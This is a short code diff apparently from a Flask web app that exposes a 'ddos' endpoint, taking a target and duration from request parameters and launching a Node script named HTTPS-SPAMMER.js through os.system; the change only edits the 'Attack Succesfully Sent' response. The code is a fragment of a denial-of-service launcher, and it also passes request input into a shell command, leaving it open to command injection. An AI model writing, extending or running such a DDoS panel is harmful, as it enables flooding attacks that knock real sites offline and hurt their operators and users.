@@ -9,7 +9,7 @@ def ddos():
     duration = request.args.get('duration')
     os.system("node HTTPS-SPAMMER.js {target} {duration}")
 
-    return 'Attack Succesfully Sent to ${target}'
+    return 'Attack Succesfully Sent!!!'
 
 if __name__ == '__main__':
     app.run(host='localhost', port=3000)
